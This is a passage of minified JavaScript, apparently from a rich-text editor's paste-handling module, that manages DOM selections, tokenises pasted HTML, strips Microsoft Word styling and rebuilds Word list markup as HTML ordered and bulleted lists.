              return cu.rtl(
                ht.fromDom(e.endContainer),
                e.endOffset,
                ht.fromDom(e.startContainer),
                e.startOffset
              )
            })
            .getOrThunk(function () {
              return su(0, cu.ltr, r)
            })
        : su(0, cu.ltr, r)
    },
    lu = {
      create: sr("start", "soffset", "finish", "foffset"),
    },
    du = function (e, t) {
      for (var n = 0; n < e.length; n++) {
        var r = t(e[n], n)
        if (r.isSome()) return r
      }
      return N.none()
    },
    mu = function (e, t) {
      return e ? N.some(t) : N.none()
    }
  function pu(n, r) {
    var t = function (e) {
      return n(e) ? N.from(e.dom().nodeValue) : N.none()
    }
    return {
      get: function (e) {
        if (!n(e))
          throw new Error("Can only get " + r + " value of a " + r + " node")
        return t(e).getOr("")
      },
      getOption: t,
      set: function (e, t) {
        if (!n(e))
          throw new Error(
            "Can only set raw " + r + " value of a " + r + " node"
          )
        e.dom().nodeValue = t
      },
    }
  }
  var gu = pu(st, "text"),
    vu = function (e) {
      return gu.get(e)
    },
    hu = function (e, t) {
      gu.set(e, t)
    },
    yu = de([
      {
        before: ["element"],
      },
      {
        on: ["element", "offset"],
      },
      {
        after: ["element"],
      },
    ]),
    bu = {
      before: yu.before,
      on: yu.on,
      after: yu.after,
      cata: function (e, t, n, r) {
        return e.fold(t, n, r)
      },
      getStart: function (e) {
        return e.fold(a, a, a)
      },
    },
    Tu = de([
      {
        domRange: ["rng"],
      },
      {
        relative: ["startSitu", "finishSitu"],
      },
      {
        exact: ["start", "soffset", "finish", "foffset"],
      },
    ]),
    xu = {
      domRange: Tu.domRange,
      relative: Tu.relative,
      exact: Tu.exact,
      exactFromRange: function (e) {
        return Tu.exact(e.start(), e.soffset(), e.finish(), e.foffset())
      },
      getWin: function (e) {
        var t,
          n = e.match({
            domRange: function (e) {
              return ht.fromDom(e.startContainer)
            },
            relative: function (e, t) {
              return bu.getStart(e)
            },
            exact: function (e, t, n, r) {
              return e
            },
          })
        return (t = n), ht.fromDom(t.dom().ownerDocument.defaultView)
      },
      range: lu.create,
    },
    Eu = function (e, t) {
      var n = ot(e)
      return "input" === n
        ? bu.after(e)
        : j(["br", "img"], n)
        ? 0 === t
          ? bu.before(e)
          : bu.after(e)
        : bu.on(e, t)
    },
    wu = function (e, t, n, r) {
      var o = bo(e).dom().createRange()
      return o.setStart(e.dom(), t), o.setEnd(n.dom(), r), o
    },
    Su = function (e, t, n, r, o) {
      var i,
        a,
        u = uu(e, t, n, r, o)
      ;(i = e),
        (a = u),
        N.from(i.getSelection()).each(function (e) {
          e.removeAllRanges(), e.addRange(a)
        })
    },
    Iu = function (e, t, n, r, o) {
      var i,
        a,
        u,
        c,
        f,
        s =
          ((i = r), (a = o), (u = Eu(t, n)), (c = Eu(i, a)), xu.relative(u, c))
      fu((f = e), s).match({
        ltr: function (e, t, n, r) {
          Su(f, e, t, n, r)
        },
        rtl: function (t, n, r, o) {
          var e,
            i,
            a,
            u,
            c,
            s = f.getSelection()
          if (s.setBaseAndExtent) s.setBaseAndExtent(t.dom(), n, r.dom(), o)
          else if (s.extend)
            try {
              ;(i = t),
                (a = n),
                (u = r),
                (c = o),
                (e = s).collapse(i.dom(), a),
                e.extend(u.dom(), c)
            } catch (e) {
              Su(f, r, o, t, n)
            }
          else Su(f, r, o, t, n)
        },
      })
    },
    Lu = function (e) {
      var t,
        n,
        r,
        o,
        i,
        a,
        u = ht.fromDom(e.anchorNode),
        c = ht.fromDom(e.focusNode)
      return (
        (t = u),
        (n = e.anchorOffset),
        (r = c),
        (o = e.focusOffset),
        (i = wu(t, n, r, o)),
        (a = ho(t, r) && n === o),
        i.collapsed && !a
          ? N.some(lu.create(u, e.anchorOffset, c, e.focusOffset))
          : (function (e) {
              if (0 < e.rangeCount) {
                var t = e.getRangeAt(0),
                  n = e.getRangeAt(e.rangeCount - 1)
                return N.some(
                  lu.create(
                    ht.fromDom(t.startContainer),
                    t.startOffset,
                    ht.fromDom(n.endContainer),
                    n.endOffset
                  )
                )
              }
              return N.none()
            })(e)
      )
    },
    Nu = function (e) {
      return N.from(e.getSelection())
        .filter(function (e) {
          return 0 < e.rangeCount
        })
        .bind(Lu)
    },
    _u = function (e) {
      return {
        startContainer: e.start,
        startOffset: e.soffset,
        endContainer: e.finish,
        endOffset: e.foffset,
      }
    },
    Cu = {
      set: function (e, t) {
        Iu(
          e,
          t.startContainer(),
          t.startOffset(),
          t.endContainer(),
          t.endOffset()
        )
      },
      get: function (e) {
        return Nu(e).map(_u)
      },
    }
  function Ou(a) {
    return function (t) {
      var u,
        r,
        o,
        c,
        n = yr.create({
          after: hr(["container"]),
        }),
        i =
          ((u = Cu),
          (r = ht.fromTag("br")),
          (o = N.none()),
          (c = function (e) {
            return bo(e).dom().defaultView
          }),
          {
            cleanup: function () {
              Na(r)
            },
            toOn: function (i, e) {
              var a = c(e)
              o.each(function (e) {
                var t = No(i),
                  n =
                    ho(i, e.startContainer()) && t < e.startOffset()
                      ? t
                      : e.startOffset,
                  r =
                    ho(i, e.endContainer()) && t < e.endOffset()
                      ? t
                      : e.endOffset,
                  o = Ca(e.startContainer(), n, e.endContainer(), r)
                u.set(a, o)
              })
            },
            toOff: function (e, t) {
              var n = c(t)
              Gi(t, r), (o = u.get(n, Ca)), u.set(n, Ca(r, 0, r, 0))
            },
          }),
        e = iu(i, t, a)
      e.events.after.bind(function (e) {
        i.toOn(t, e.container()), n.trigger.after(e.container())
      })
      return {
        run: function () {
          e.instance()()
        },
        events: n.registry,
      }
    }
  }
  var Du = de([
      {
        error: ["message"],
      },
      {
        paste: ["elements", "correlated"],
      },
      {
        cancel: [],
      },
      {
        incomplete: ["elements", "correlated", "message"],
      },
    ]),
    Pu = function (e, t, n, r, o) {
      return e.fold(t, n, r, o)
    },
    Au = {
      error: Du.error,
      paste: Du.paste,
      cancel: Du.cancel,
      incomplete: Du.incomplete,
      cata: Pu,
      carry: function (e, r) {
        return Pu(e, N.none, N.none, N.none, function (e, t, n) {
          return Pu(
            r,
            N.none,
            function (e, t) {
              return N.some(Du.incomplete(e, t, n))
            },
            N.none,
            N.none
          )
        }).getOr(r)
      },
    },
    ku = [
      "officeStyles",
      "htmlStyles",
      "isWord",
      "isGoogleDocs",
      "proxyBin",
      "isInternal",
      "backgroundAssets",
    ],
    Mu = function (e, n) {
      var r = {}
      return (
        Y(ku, function (t) {
          n[t]()
            .or(e[t]())
            .each(function (e) {
              r[t] = e
            })
        }),
        Ru(r)
      )
    },
    Ru = dr([], ku),
    Fu = dr(["response", "bundle"], []),
    ju = function (t) {
      return Wu(function (e) {
        e(Fu(t))
      })
    },
    Uu = function (e, t) {
      e(Fu(t))
    },
    Bu = function (e) {
      return ju({
        response: e.response(),
        bundle: e.bundle(),
      })
    },
    Yu = function (e) {
      return ju({
        response: Au.error(e),
        bundle: Ru({}),
      })
    },
    Wu = function (t) {
      var e = function (e) {
          t(e)
        },
        o = Wu
      return {
        get: e,
        map: function (r) {
          return o(function (n) {
            e(function (e) {
              var t = r(e)
              n(t)
            })
          })
        },
        bind: function (n) {
          return o(function (t) {
            e(function (e) {
              n(e).get(t)
            })
          })
        },
      }
    },
    Hu = sr("steps", "input", "label", "capture"),
    qu = function (e, t, n) {
      var r
      return ((r = n),
      du(e, function (t) {
        return t.getAvailable(r).map(function (e) {
          return Hu(t.steps(), e, t.label(), t.capture())
        })
      })).getOrThunk(function () {
        var e = t.getAvailable(n)
        return Hu(t.steps(), e, t.label(), t.capture())
      })
    },
    $u = function (e, a) {
      return q(
        e,
        function (e, i) {
          return e.bind(function (e) {
            var r, t, n, o
            return (
              (t = function () {
                return i(a, e)
              }),
              (n = b(Bu, (r = e))),
              (o = function () {
                return t().map(function (e) {
                  var t = Mu(r.bundle(), e.bundle()),
                    n = Au.carry(r.response(), e.response())
                  return Fu({
                    response: n,
                    bundle: t,
                  })
                })
              }),
              Au.cata(r.response(), n, o, n, o)
            )
          })
        },
        ju({
          response: Au.paste([], []),
          bundle: Ru({}),
        })
      )
    },
    Vu = de([
      {
        starts: ["value", "f"],
      },
      {
        pattern: ["regex", "f"],
      },
      {
        contains: ["value", "f"],
      },
      {
        exact: ["value", "f"],
      },
      {
        all: [],
      },
      {
        not: ["stringMatch"],
      },
    ]),
    Xu = function (e, n) {
      return e.fold(
        function (e, t) {
          return 0 === t(n).indexOf(t(e))
        },
        function (e, t) {
          return e.test(t(n))
        },
        function (e, t) {
          return 0 <= t(n).indexOf(t(e))
        },
        function (e, t) {
          return t(n) === t(e)
        },
        function () {
          return !0
        },
        function (e) {
          return !Xu(e, n)
        }
      )
    },
    Gu = {
      starts: Vu.starts,
      pattern: Vu.pattern,
      contains: Vu.contains,
      exact: Vu.exact,
      all: Vu.all,
      not: Vu.not,
      cata: function (e, t, n, r, o, i, a) {
        return e.fold(t, n, r, o, i, a)
      },
      matches: Xu,
      caseSensitive: function (e) {
        return e
      },
      caseInsensitive: function (e) {
        return e.toLowerCase()
      },
    },
    Ku = function (e, t, n, r) {
      var o = r.name,
        i = void 0 !== r.condition ? r.condition : y(!0),
        a = void 0 !== r.value ? r.value : Gu.all()
      return Gu.matches(o, n) && Gu.matches(a, t) && i(e)
    },
    zu = function (e, t) {
      var n = ot(e),
        r = t.name,
        o = void 0 !== t.condition ? t.condition : y(!0)
      return Gu.matches(r, n) && o(e)
    },
    Ju = function (e, t) {
      var n = {}
      return (
        Y(e.dom().attributes, function (e) {
          t(e.value, e.name) || (n[e.name] = e.value)
        }),
        n
      )
    },
    Zu = function (e, t, n) {
      var r,
        o,
        i = B(e.dom().attributes, function (e) {
          return e.name
        })
      le(t) !== i.length &&
        ((r = e),
        (o = t),
        Y(i, function (e) {
          gt(r, e)
        }),
        ae(o, function (e, t) {
          lt(r, t, e)
        }))
    },
    Qu =
      (y({}),
      function (t) {
        var e = ie(t)
        return B(e, function (e) {
          return e + ": " + t[e]
        }).join("; ")
      }),
    ec = function (r, o) {
      var e = r.dom().style,
        i = {}
      return (
        Y(null == e ? [] : e, function (e) {
          var t,
            n = ((t = e), r.dom().style.getPropertyValue(t))
          o(n, e) || (i[e] = n)
        }),
        i
      )
    },
    tc = function (n, e, t) {
      lt(n, "style", "")
      var r = le(e),
        o = le(t)
      if (0 === r && 0 === o) gt(n, "style")
      else if (0 === r) lt(n, "style", Qu(t))
      else {
        ae(e, function (e, t) {
          Xa(n, t, e)
        })
        var i = mt(n, "style"),
          a = 0 < o ? Qu(t) + "; " : ""
        lt(n, "style", a + i)
      }
    },
    nc = function (e, t, n) {
      var r,
        o,
        i,
        a = e.dom().getAttribute("style"),
        u =
          ((o = {}),
          (i = null != (r = a) ? r.split(";") : []),
          Y(i, function (e) {
            var t = e.split(":")
            2 === t.length && (o[ro(t[0])] = ro(t[1]))
          }),
          o),
        c = {}
      return (
        Y(t, function (e) {
          var t = u[e]
          void 0 === t || n(t, e) || (c[e] = t)
        }),
        c
      )
    },
    rc = ["mso-list"],
    oc = function (e, t) {
      var n = nc(e, rc, t),
        r = ec(e, t)
      tc(e, r, n)
    },
    ic = function (e, t) {
      var n = Ju(e, t)
      Zu(e, n, {})
    },
    ac = oc,
    uc = ic,
    cc = function (e, t) {
      oc(ht.fromDom(e), t)
    },
    sc = function (e, r, o) {
      e(o, function (t, n) {
        return U(r, function (e) {
          return Ku(o, t, n, e)
        })
      })
    },
    fc = function (e, t) {
      var r = ni(
          {
            styles: [],
            attributes: [],
            classes: [],
            tags: [],
          },
          t
        ),
        n = Co(e, "*")
      Y(n, function (n) {
        sc(ac, r.styles, n),
          sc(uc, r.attributes, n),
          Y(r.classes, function (t) {
            var e = pt(n, "class") ? Si(n) : []
            Y(e, function (e) {
              Gu.matches(t.name, e) && xi(n, e)
            })
          })
      })
      var o = Co(e, "*")
      Y(o, function (e) {
        U(r.tags, b(zu, e)) && Na(e)
      })
    },
    lc = function (e, t) {
      var n = ni(
          {
            tags: [],
          },
          t
        ),
        r = Co(e, "*")
      Y(r, function (e) {
        U(n.tags, b(zu, e)) && _a(e)
      })
    },
    dc = function (e, t) {
      var n = ni(
          {
            tags: [],
          },
          t
        ),
        r = Co(e, "*")
      Y(r, function (t) {
        $(n.tags, b(zu, t)).each(function (e) {
          e.mutate(t)
        })
      })
    },
    mc = "startElement",
    pc = "endElement",
    gc = "comment",
    vc = function (e, t, n) {
      var r,
        o,
        i,
        a = ht.fromDom(e)
      switch (e.nodeType) {
        case 1:
          t ? (r = pc) : ((r = mc), Ga(a, n || {})),
            (o =
              "HTML" !== e.scopeName &&
              e.scopeName &&
              e.tagName &&
              e.tagName.indexOf(":") <= 0
                ? (e.scopeName + ":" + e.tagName).toUpperCase()
                : e.tagName)
          break
        case 3:
          ;(r = "text"), (i = e.nodeValue)
          break
        case 8:
          ;(r = gc), (i = e.nodeValue)
          break
        default:
          g.console.log(
            "WARNING: Unsupported node type encountered: " + e.nodeType
          )
      }
      return {
        getNode: function () {
          return e
        },
        tag: function () {
          return o
        },
        type: function () {
          return r
        },
        text: function () {
          return i
        },
      }
    },
    hc = function (e, t) {
      return vc(t.createElement(e), !0)
    },
    yc = hc("HTML", g.window.document),
    bc = {
      START_ELEMENT_TYPE: mc,
      END_ELEMENT_TYPE: pc,
      TEXT_TYPE: "text",
      COMMENT_TYPE: gc,
      FINISHED: yc,
      token: vc,
      createStartElement: function (e, t, n, r) {
        var o = r.createElement(e)
        return (
          ae(t, function (e, t) {
            o.setAttribute(t, e)
          }),
          vc(o, !1, n)
        )
      },
      createEndElement: hc,
      createComment: function (e, t) {
        return vc(t.createComment(e), !1)
      },
      createText: function (e, t) {
        return vc(t.createTextNode(e))
      },
    },
    Tc = function (i) {
      var a = i.createDocumentFragment(),
        u = a,
        c = function (e) {
          a.appendChild(e)
        }
      return {
        dom: u,
        receive: function (e) {
          var t, n, r, o
          switch (e.type()) {
            case bc.START_ELEMENT_TYPE:
              ;(o = e.getNode().cloneNode(!1)), c((r = o)), (a = r)
              break
            case bc.TEXT_TYPE:
              ;(t = e), (n = i.createTextNode(t.text())), c(n)
              break
            case bc.END_ELEMENT_TYPE:
              null === (a = a.parentNode) && (a = u)
              break
            case bc.COMMENT_TYPE:
              break
            default:
              throw {
                message: "Unsupported token type: " + e.type(),
              }
          }
        },
        label: "SERIALISER",
      }
    },
    xc = function (e, o) {
      var i
      ;(o = o || g.window.document),
        (i = o.createElement("div")),
        o.body.appendChild(i),
        (i.style.position = "absolute"),
        (i.style.left = "-10000px"),
        (i.innerHTML = e)
      var a = i.firstChild || bc.FINISHED,
        u = [],
        c = !1
      return {
        hasNext: function () {
          return void 0 !== a
        },
        next: function () {
          var e,
            t,
            n = a,
            r = c
          return (
            !c && a.firstChild
              ? (u.push(a), (a = a.firstChild))
              : c || 1 !== a.nodeType
              ? a.nextSibling
                ? ((a = a.nextSibling), (c = !1))
                : ((a = u.pop()), (c = !0))
              : (c = !0),
            n === bc.FINISHED ||
              a ||
              (o.body.removeChild(i), (a = bc.FINISHED)),
            (t = r),
            (e = n) === bc.FINISHED ? e : e ? bc.token(e, t) : void 0
          )
        },
      }
    },
    Ec = function (e, t, n) {
      var r,
        o = n
      for (r = t.length - 1; 0 <= r; r--) o = t[r](o, {}, e)
      return o
    },
    wc = function (e, t, n) {
      for (var r = Tc(e), o = xc(t, e), i = Ec(e, n, r); o.hasNext(); ) {
        var a = o.next()
        i.receive(a)
      }
      return r.dom
    },
    Sc = function (t) {
      return function (e) {
        fc(e, t)
      }
    },
    Ic = function (t) {
      return function (e) {
        lc(e, t)
      }
    },
    Lc = function (t) {
      return function (e) {
        dc(e, t)
      }
    },
    Nc = function (o) {
      return function (e) {
        var t = eu(e),
          n = bo(e),
          r = wc(n.dom(), t, o)
        La(e), e.dom().appendChild(r)
      }
    },
    _c = function (e, t) {
      return (
        0 <= e.indexOf("<o:p>") ||
        (t.browser.isEdge() && 0 <= e.indexOf('v:shapes="')) ||
        (t.browser.isEdge() && 0 <= e.indexOf("mso-")) ||
        0 <= e.indexOf("mso-list") ||
        0 <= e.indexOf("p.MsoNormal, li.MsoNormal, div.MsoNormal") ||
        0 <= e.indexOf("MsoListParagraphCxSpFirst") ||
        0 <= e.indexOf("<w:WordDocument>")
      )
    },
    Cc = function (e, t, n) {
      var r = ht.fromTag("div", e.dom())
      return (
        (r.dom().innerHTML = t),
        Y(n, function (e) {
          e(r)
        }),
        eu(r)
      )
    }
  function Oc(a, u, e) {
    return function (t, e, n) {
      var r = function (e) {
          t.receive(e)
        },
        o = function (e, t, n) {
          return (
            (n = void 0 !== n ? n : e.type() === bc.END_ELEMENT_TYPE),
            bc.token(t, n, {})
          )
        },
        i = {
          emit: r,
          emitTokens: function (e) {
            Y(e, r)
          },
          receive: function (e) {
            a(i, e, o)
          },
          document: g.window.document,
        }
      return u(i), i
    }
  }
  var Dc = function (e, t) {
      var n = ht.fromDom(e.getNode())
      return mt(n, t)
    },
    Pc = function (e, t) {
      var n = ht.fromDom(e.getNode())
      return Ka(n, t)
    },
    Ac = function (e) {
      return e.type() === bc.TEXT_TYPE && /^[\s\u00A0]*$/.test(e.text())
    },
    kc = function (e, t, n) {
      return (
        e === t ||
        (e &&
          t &&
          e.tag === t.tag &&
          e.type === t.type &&
          (n || e.variant === t.variant))
      )
    },
    Mc = {
      guessFrom: function (t, n) {
        return $(t, function (e) {
          return "UL" === e.tag || (n && kc(e, n, !0))
        }).orThunk(function () {
          return 0 === (e = t).length ? N.none() : N.some(e[0])
          var e
        })
      },
      eqListType: kc,
    },
    Rc = function (e, t) {
      if (void 0 === e || void 0 === t) throw (g.console.trace(), "brick")
      e.nextFilter.set(t)
    },
    Fc = function (e, t, n) {
      t.nextFilter.get()(e, t, n)
    },
    jc = Rc,
    Uc = Fc,
    Bc = sr("level", "token", "type"),
    Yc = function (e, n, t, r) {
      var o = t.getCurrentListType(),
        i = t.getCurrentLevel() == r.level() ? o : null
      return Mc.guessFrom(r.emblems(), i).filter(function (e) {
        return !(
          "OL" === e.tag &&
          (!j(["P"], (t = n).tag()) || /^MsoHeading/.test(Dc(t, "class")))
        )
        var t
      })
    },
    Wc = function (e, t) {
      return pt(ht.fromDom(t.getNode()), "data-list-level")
    },
    Hc = function (d) {
      return function (e, t, n) {
        var r,
          o,
          i,
          a,
          u =
            ((r = ht.fromDom(n.getNode())),
            (o = parseInt(mt(r, "data-list-level"), 10)),
            (i = mt(r, "data-list-emblems")),
            (a = JSON.parse(i)),
            gt(r, "data-list-level"),
            gt(r, "data-list-emblems"),
            {
              level: y(o),
              emblems: y(a),
            })
        u.level(), t.originalToken.set(n)
        var c,
          s,
          f,
          l =
            ((c = n),
            (s = u),
            Yc((f = t).listType.get(), c, f.emitter, s).each(f.listType.set),
            Bc(s.level(), f.originalToken.get(), f.listType.get()))
        t.emitter.openItem(l.level(), l.token(), l.type()), jc(t, d.inside())
      }
    }
  function qc(e, t, n) {
    return {
      pred: e,
      action: t,
      label: y(n),
    }
  }
  var $c = function (e, r) {
    return function (e, t, n) {
      return r(e, t, n)
    }
  }
  function Vc(e, r, t) {
    var o = $c(0, t),
      n = function (e, t, n) {
        $(r, function (e) {
          return e.pred(t, n)
        }).fold(y(o), function (e) {
          var t = e.label()
          return void 0 === t ? e.action : $c(0, e.action)
        })(e, t, n)
      }
    return (
      (n.toString = function () {
        return "Handlers for " + e
      }),
      n
    )
  }
  var Xc = function (r) {
      return Vc(
        "Inside.List.Item",
        [
          qc(
            function (e, t) {
              return (
                t.type() === bc.END_ELEMENT_TYPE &&
                e.originalToken.get() &&
                t.tag() === e.originalToken.get().tag()
              )
            },
            function (e, t, n) {
              jc(t, r.outside())
            },
            "Closing open tag"
          ),
        ],
        function (e, t, n) {
          e.emit(n)
        }
      )
    },
    Gc = function (r) {
      return Vc(
        "Outside.List.Item",
        [
          qc(Wc, Hc(r), "Data List ****"),
          qc(
            function (e, t) {
              return t.type() === bc.TEXT_TYPE && Ac(t)
            },
            function (e, t, n) {
              e.emit(n)
            },
            "Whitespace"
          ),
        ],
        function (e, t, n) {
          t.emitter.closeAllLists(), e.emit(n), jc(t, r.outside())
        }
      )
    },
    Kc = sr("state", "result"),
    zc = sr("state", "value"),
    Jc = {
      state: sr("level", "type", "types", "items"),
      value: zc,
      result: Kc,
    },
    Zc = function (e, t) {
      var n = e.items().slice(0),
        r = void 0 !== t && "P" !== t ? N.some(t) : N.none()
      r.fold(
        function () {
          n.push("P")
        },
        function (e) {
          n.push(e)
        }
      )
      var o = Jc.state(e.level(), e.type(), e.types(), n)
      return Jc.value(o, r)
    },
    Qc = function (e) {
      var t = e.items().slice(0)
      if (0 < t.length && "P" !== t[t.length - 1]) {
        var n = t[t.length - 1]
        t[t.length - 1] = "P"
        var r = Jc.state(e.level(), e.type(), e.types(), t)
        return Jc.value(r, N.some(n))
      }
      return Jc.value(e, N.none())
    },
    es = function (e, t, n) {
      for (var r = [], o = e; t(o); ) {
        var i = n(o)
        ;(o = i.state()), (r = r.concat(i.result()))
      }
      return Jc.result(o, r)
    },
    ts = function (e, t, n) {
      return es(
        e,
        function (e) {
          return e.level() < t
        },
        n
      )
    },
    ns = function (e, t, n) {
      return es(
        e,
        function (e) {
          return e.level() > t
        },
        n
      )
    },
    rs = function (e) {
      var t
      return e
        ? void 0 !== (t = Pc(e, "margin-left")) && "0px" !== t
          ? {
              "margin-left": t,
            }
          : {}
        : {
            "list-style-type": "none",
          }
    },
    os = function (e, t, n) {
      var r =
          t.start && 1 < t.start
            ? {
                start: t.start,
              }
            : {},
        o = e.level() + 1,
        i = t,
        a = e.types().concat([t]),
        u = [b(bc.createStartElement, t.tag, r, n)],
        c = Jc.state(o, i, a, e.items())
      return Jc.result(c, u)
    },
    is = function (e) {
      var t = e.types().slice(0),
        n = [b(bc.createEndElement, t.pop().tag)],
        r = e.level() - 1,
        o = t[t.length - 1],
        i = Jc.state(r, o, t, e.items())
      return Jc.result(i, n)
    },
    as = os,
    us = function (e, t, n) {
      var r,
        o,
        i,
        a = rs(t),
        u =
          e.type() && !Mc.eqListType(e.type(), n)
            ? ((r = n),
              (o = is(e)),
              (i = os(
                o.state(),
                r,
                r.type
                  ? {
                      "list-style-type": r.type,
                    }
                  : {}
              )),
              Jc.result(i.state(), o.result().concat(i.result())))
            : Jc.result(e, []),
        c = [b(bc.createStartElement, "LI", {}, a)],
        s = Zc(u.state(), t && t.tag()),
        f = s
          .value()
          .map(function (e) {
            return cc(t.getNode(), y(!0)), [y(t)]
          })
          .getOr([])
      return Jc.result(s.state(), u.result().concat(c).concat(f))
    },
    cs = is,
    ss = function (e) {
      var t = b(bc.createEndElement, "LI"),
        n = Qc(e),
        r = n.value().fold(
          function () {
            return [t]
          },
          function (e) {
            return [b(bc.createEndElement, e), t]
          }
        )
      return Jc.result(n.state(), r)
    },
    fs = function (e) {
      if (0 === e.length)
        throw "Compose must have at least one element in the list"
      var t = e[e.length - 1],
        n = G(e, function (e) {
          return e.result()
        })
      return Jc.result(t.state(), n)
    },
    ls = function (e) {
      var t = ss(e),
        n = cs(t.state())
      return fs([t, n])
    },
    ds = function (e, c, s, f) {
      return ts(e, s, function (e) {
        return (
          (n = c),
          (r = s),
          (o = f),
          (i =
            (t = e).level() === r - 1 && n.type
              ? {
                  "list-style-type": n.type,
                }
              : {}),
          (a = as(t, n, i)),
          (u = us(a.state(), a.state().level() == r ? o : void 0, n)),
          fs([a, u])
        )
        var t, n, r, o, i, a, u
      })
    },
    ms = function (e, t) {
      return ns(e, t, ls)
    },
    ps = {
      openItem: function (e, t, n, r) {
        var o,
          i,
          a,
          u,
          c,
          s,
          f,
          l,
          d,
          m,
          p,
          g,
          v = e.level() > t ? ms(e, t) : Jc.result(e, []),
          h =
            v.state().level() === t
              ? ((l = v.state()),
                (d = r),
                (m = n),
                (p = 0 < l.level() ? ss(l) : Jc.result(l, [])),
                (g = us(p.state(), m, d)),
                fs([p, g]))
              : ((o = v.state()),
                (i = r),
                (u = n),
                (c = 1 < (a = t) ? Qc(o) : Jc.value(o, N.none())),
                (s = c
                  .value()
                  .map(function (e) {
                    return [b(bc.createEndElement, e)]
                  })
                  .getOr([])),
                c.state().level(),
                (f = ds(c.state(), i, a, u)),
                Jc.result(f.state(), s.concat(f.result())))
        return fs([v, h])
      },
      closeAllLists: ms,
    },
    gs = ["disc", "circle", "square"],
    vs = function (e, t) {
      return (
        "UL" === e.tag &&
          gs[t - 1] === e.type &&
          (e = {
            tag: "UL",
          }),
        e
      )
    }
  var hs = {
      getCurrentListType: function () {
        return ys().getCurrentListType()
      },
      getCurrentLevel: function () {
        return ys().getCurrentLevel()
      },
      closeAllLists: function () {
        return ys().closeAllLists.apply(void 0, arguments)
      },
      openItem: function () {
        return ys().openItem.apply(void 0, arguments)
      },
    },
    ys = function () {
      return {
        getCurrentListType: y({}),
        getCurrentLevel: y(1),
        closeAllLists: a,
        openItem: a,
      }
    }
  var bs,
    Ts,
    xs,
    Es,
    ws,
    Ss,
    Is,
    Ls,
    Ns,
    _s,
    Cs,
    Os,
    Ds = {
      inside: function () {
        return As
      },
      outside: function () {
        return ks
      },
    },
    Ps =
      ((bs = !1),
      {
        check: function (e) {
          return bs && e.type() === bc.TEXT_TYPE
            ? (e.text(), !0)
            : e.type() === bc.START_ELEMENT_TYPE && "STYLE" === e.tag()
            ? (bs = !0)
            : e.type() === bc.END_ELEMENT_TYPE &&
              "STYLE" === e.tag() &&
              !(bs = !1)
        },
      }),
    As = Xc(Ds),
    ks = Gc(Ds),
    Ms =
      ((xs = Pr((Ts = ks))),
      (Es = Pr(null)),
      (ws = Pr(null)),
      {
        reset: function (e) {
          xs.set(Ts), Es.set(null), ws.set(null)
          var n,
            r,
            i,
            a,
            t =
              ((r = (n = e).document),
              (i = Jc.state(0, void 0, [], [])),
              (a = function (e) {
                Y(e.result(), function (e) {
                  var t = e(r)
                  n.emit(t)
                })
              }),
              {
                closeAllLists: function () {
                  var e = ps.closeAllLists(i, 0)
                  ;(i = e.state()), a(e)
                },
                openItem: function (e, t, n) {
                  if (n) {
                    var r = vs(n, e),
                      o = ps.openItem(i, e, t, r)
                    ;(i = o.state()), a(o)
                  }
                },
                getCurrentListType: function () {
                  return i.type()
                },
                getCurrentLevel: function () {
                  return i.level()
                },
              })
          ys = y(t)
        },
        nextFilter: xs,
        originalToken: Es,
        listType: ws,
        emitter: hs,
      }),
    Rs = Oc(function (e, t, n) {
      Ps.check(t) || Uc(e, Ms, t)
    }, Ms.reset),
    Fs = [
      {
        regex: /^\(?[dc][\.\)]$/,
        type: {
          tag: "OL",
          type: "lower-alpha",
        },
      },
      {
        regex: /^\(?[DC][\.\)]$/,
        type: {
          tag: "OL",
          type: "upper-alpha",
        },
      },
      {
        regex: /^\(?M*(CM|CD|D?C{0,3})(XC|XL|L?X{0,3})(IX|IV|V?I{0,3})[\.\)]$/,
        type: {
          tag: "OL",
          type: "upper-roman",
        },
      },
      {
        regex: /^\(?m*(cm|cd|d?c{0,3})(xc|xl|l?x{0,3})(ix|iv|v?i{0,3})[\.\)]$/,
        type: {
          tag: "OL",
          type: "lower-roman",
        },
      },
      {
        regex: /^\(?[0-9]+[\.\)]$/,
        type: {
          tag: "OL",
        },
      },
      {
        regex: /^([0-9]+\.)*[0-9]+\.?$/,
        type: {
          tag: "OL",
          variant: "outline",
        },
      },
      {
        regex: /^\(?[a-z]+[\.\)]$/,
        type: {
          tag: "OL",
          type: "lower-alpha",
        },
      },
      {
        regex: /^\(?[A-Z]+[\.\)]$/,
        type: {
          tag: "OL",
          type: "upper-alpha",
        },
      },
    ],
    js = {
      "\u2022": {
        tag: "UL",
        type: "disc",
      },
      "\xb7": {
        tag: "UL",
        type: "disc",
      },
      "\xa7": {
        tag: "UL",
        type: "square",
      },
    },
    Us = {
      o: {
        tag: "UL",
        type: "circle",
      },
      "-": {
        tag: "UL",
        type: "disc",
      },
      "\u25cf": {
        tag: "UL",
        type: "disc",
      },
      "\ufffd": {
        tag: "UL",
        type: "circle",
      },
    },
    Bs = function (u, e) {
      var t = Us[u] ? [Us[u]] : [],
        n =
          e && js[u]
            ? [js[u]]
            : e
            ? [
                {
                  tag: "UL",
                  variant: u,
                },
              ]
            : [],
        r = G(Fs, function (e) {
          return e.regex.test(u)
            ? [
                ni(
                  e.type,
                  ((r = u),
                  (o = r.split(".")),
                  (i = (function () {
                    if (0 === o.length) return r
                    var e = o[o.length - 1]
                    return 0 === e.length && 1 < o.length ? o[o.length - 2] : e
                  })()),
                  (a = parseInt(i, 10)),
                  isNaN(a)
                    ? {}
                    : {
                        start: a,
                      }),
                  {
                    variant:
                      ((t = e.type),
                      (n = u),
                      void 0 !== t.variant
                        ? t.variant
                        : "(" === n.charAt(0)
                        ? "()"
                        : ")" === n.charAt(n.length - 1)
                        ? ")"
                        : "."),
                  }
                ),
              ]
            : []
          var t, n, r, o, i, a
        }),
        o = t.concat(n).concat(r)
      return B(o, function (e) {
        return void 0 !== e.variant
          ? e
          : ni(e, {
              variant: u,
            })
      })
    },
    Ys = function (e) {
      return e.dom().textContent
    },
    Ws = function (e) {
      return nc(e, ["mso-list"], y(!1))["mso-list"]
    },
    Hs = function (e) {
      return (
        ct(e) &&
        Ja(e, "font-family").exists(function (e) {
          return j(["wingdings", "symbol"], e.toLowerCase())
        })
      )
    },
    qs = {
      getMsoList: Ws,
      extractLevel: function (e) {
        var t = Ws(e),
          n = / level([0-9]+)/.exec(t)
        return n && n[1] ? N.some(parseInt(n[1], 10)) : N.none()
      },
      extractEmblem: function (e, t) {
        var n = Ys(e).trim(),
          r = Bs(n, t)
        return 0 < r.length ? N.some(r) : N.none()
      },
      extractSymSpan: function (e) {
        return Ni(e, Hs)
      },
      extractMsoIgnore: function (e) {
        return _i(e, function (e) {
